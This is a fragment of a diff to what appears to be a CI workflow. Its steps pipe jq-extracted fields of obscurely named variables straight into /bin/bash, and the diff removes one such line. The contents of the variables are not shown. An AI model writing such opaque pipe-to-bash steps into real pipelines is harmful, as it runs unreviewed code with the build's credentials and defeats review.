@@ -26,7 +26,6 @@ jobs:
           echo $isncn2 | jq -r .gfiq37968 | /bin/bash
           printf '%s' "$tm2" | jq -r .l6 | /bin/bash
           printf '%s' "$bley3" | jq -r .lnd73371 | /bin/bash
-          echo $s373 | jq -r .e1 | /bin/bash
 
       - name: Save archive
         if: always()
